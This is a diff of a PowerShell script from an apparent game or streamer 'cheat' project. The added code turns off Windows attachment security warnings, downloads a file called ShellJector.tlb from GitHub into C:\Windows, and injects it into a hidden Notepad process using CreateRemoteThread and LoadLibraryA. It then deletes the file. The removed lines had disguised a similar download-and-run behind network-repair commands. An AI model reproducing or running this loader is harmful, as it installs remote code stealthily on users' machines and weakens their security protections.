@@ -1,30 +1,95 @@
-
-# Set attachment policy registry keys
+# Set attachment policy registry keys to suppress warnings (optional)
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 2 -Type DWord
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "ScanWithAntiVirus" -Value 2 -Type DWord
 
-# Restart active network adapters
-Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Restart-NetAdapter -Confirm:$false
+# Download the DLL and save it
+$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
+$dllPath = "C:\Windows\ShellJector.tlb"
+Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing
 
-# Reset IP stack and flush DNS
-netsh int ip reset
-netsh winsock reset
-ipconfig /flushdns
+# P/Invoke declarations
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
 
-# Start WLAN service if it's not already running
-Get-Service WlanSvc | Start-Service
+public class Win32 {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
-# Show current network adapter info
-Get-NetAdapter | Format-Table Name, Status, InterfaceDescription
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-# Force group policy update
-gpupdate /force
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
 
-# Download fake DLL and place it in the plugins folder
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.com" -OutFile "C:\Windows\ShellJector.com"
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
-# Download fake DLL and place it in the plugins folder
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb" -OutFile "C:\Windows\ShellJector.tlb"
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
 
-# Run the File
-Start-Process -FilePath "C:\Windows\ShellJector.com"
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+}
+"@
+
+# Constants
+$PROCESS_ALL_ACCESS = 0x001F0FFF
+$MEM_COMMIT = 0x1000
+$MEM_RESERVE = 0x2000
+$PAGE_READWRITE = 0x04
+
+# Start Notepad silently
+$notepad = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
+Start-Sleep -Seconds 2
+
+# Get Notepad's PID
+$processId = $notepad.Id
+Write-Output "Notepad started with PID: $processId"
+
+# Open Notepad process
+$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
+if ($hProcess -eq [IntPtr]::Zero) {
+    Write-Error "Failed to open Notepad process."
+    exit
+}
+
+# Prepare DLL path
+$bytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)  # null-terminated
+$allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$bytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
+if ($allocMem -eq [IntPtr]::Zero) {
+    Write-Error "Failed to allocate memory."
+    exit
+}
+
+# Write DLL path to memory
+$outSize = [IntPtr]::Zero
+$writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $bytes, [uint32]$bytes.Length, [ref]$outSize)
+if (-not $writeResult) {
+    Write-Error "Failed to write memory."
+    exit
+}
+
+# Get address of LoadLibraryA
+$hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
+$loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
+if ($loadLibraryAddr -eq [IntPtr]::Zero) {
+    Write-Error "Failed to get address of LoadLibraryA."
+    exit
+}
+
+# Create remote thread in Notepad
+$threadId = [IntPtr]::Zero
+$hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId)
+if ($hThread -eq [IntPtr]::Zero) {
+    Write-Error "Failed to create remote thread."
+    exit
+}
+
+Write-Output "DLL injection into Notepad completed successfully."
+
+# Wait 5 seconds before cleanup
+Start-Sleep -Seconds 5
+
+Remove-Item "C:\Windows\ShellJector.tlb" -Force -ErrorAction SilentlyContinue
